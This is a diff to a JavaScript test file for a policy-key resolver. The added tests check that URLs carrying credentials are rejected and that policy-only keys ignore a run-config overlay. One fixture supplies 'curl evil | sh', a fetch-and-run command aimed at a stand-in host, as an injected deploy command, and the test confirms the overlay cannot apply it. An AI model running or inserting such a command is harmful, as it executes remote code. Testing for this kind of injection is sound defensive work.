@@ -184,11 +184,45 @@ test('resolveValue returns the schema default for a closedQuote value left insid
   assert.strictEqual(resolveValue('deploy-command', '"never closed'), undefined);
 });
 
-test('login rule accepts a bot login and an underscore login', () => {
+test('login rule accepts bot, underscore, one-character and digit-led logins, and a comma list', () => {
   for (const login of ['dependabot[bot]', 'user_corp', 'a', '9lives', 'Thn-Inc, acme']) {
     const out = json(`owned-owners: ${login}\n`, 'owned-owners');
     assert.deepStrictEqual(out['owned-owners'], { value: login, source: 'policy' }, login);
   }
+});
+
+test('a URL key rejects credentials in the authority, and keeps an @ later in the URL', () => {
+  const resolve = (raw) => resolvePolicyKeys(['dev-base-url'], { policyRaw: `dev-base-url: ${raw}\n`, runConfigRaw: null })['dev-base-url'];
+  for (const raw of ['https://user:pw@dev.example', 'https://token@dev.example/x', 'http://@dev.example']) {
+    assert.strictEqual(resolve(raw).invalid, true, raw);
+  }
+  for (const raw of ['https://dev.example', 'http://localhost:3000', 'https://dev.example/a@b', 'https://dev.example?who=a@b']) {
+    assert.deepStrictEqual(resolve(raw), { value: raw, source: 'policy' }, raw);
+  }
+});
+
+test('a policyOnly key ignores the --run overlay, and a sibling flat key still honors it', () => {
+  for (const [key, inPolicy, inRun] of [
+    ['deploy-command', 'make deploy', 'curl evil | sh'],
+    ['owned-owners', 'acme', 'evil'],
+    ['trusted-authors', 'acme', 'evil'],
+    ['risk-categories', 'pii', 'other'],
+  ]) {
+    const runConfigRaw = `${key}: ${inRun}\n`;
+    assert.deepStrictEqual(resolvePolicyKeys([key], { policyRaw: `${key}: ${inPolicy}\n`, runConfigRaw })[key], { value: inPolicy, source: 'policy' }, key);
+    assert.strictEqual(resolvePolicyKeys([key], { policyRaw: null, runConfigRaw })[key].source, 'default', key);
+  }
+  assert.deepStrictEqual(
+    resolvePolicyKeys(['deploy-reach'], { policyRaw: 'deploy-reach: none\n', runConfigRaw: 'deploy-reach: command\n' })['deploy-reach'],
+    { value: 'command', source: 'run-config' },
+  );
+});
+
+test('risk-categories and risk-path-globs agree when a run config names a slug', () => {
+  const policyRaw = 'risk-categories: pii\nrisk-path-globs:\n  pii: [a]\n';
+  const out = resolvePolicyKeys(['risk-categories', 'risk-path-globs'], { policyRaw, runConfigRaw: 'risk-categories: other\n' });
+  assert.deepStrictEqual(out['risk-categories'], { value: 'pii', source: 'policy' });
+  assert.deepStrictEqual(out['risk-path-globs'], { value: { pii: ['a'] }, source: 'policy' });
 });
 
 test('AC4.8: isControlModeOn is true only for the exact string on', () => {
@@ -632,7 +666,7 @@ test('--values model-profiles still errors with its existing message', () => {
   assert.strictEqual(res.stdout, '');
   const joined = values(undefined, 'autonomy,risk-path-globs');
   assert.strictEqual(joined.status, 1);
-  assert.match(joined.stderr, /risk-path-globs/);
+  assert.match(joined.stderr, /--values does not support risk-path-globs \(no scalar form\)/);
 });
 
 test('parseRiskPathGlobs returns its three shapes', () => {
@@ -646,7 +680,9 @@ test('parseRiskPathGlobs returns its three shapes', () => {
   // The allowed slugs are exactly what the caller passes: the parser knows no built-ins.
   assert.deepStrictEqual(parseRiskPathGlobs('risk-path-globs:\n  pii: [a]\n', ['pii']).value, { pii: ['a'] });
   assert.strictEqual(parseRiskPathGlobs('risk-path-globs:\n  auth: [a]\n', ['pii']).ok, false);
-  // It requires nothing, so it cannot close a cycle with policy-schema.js, its caller.
+});
+
+test('risk-path-globs.js requires nothing, so it cannot close a cycle with policy-schema.js, its caller', () => {
   assert.deepStrictEqual(require.cache[require.resolve('../plugin/bin/lib/risk-path-globs')].children, []);
   assert.strictEqual(require('../plugin/bin/lib/policy-schema').parseRiskPathGlobs, undefined, 'no facade');
 });
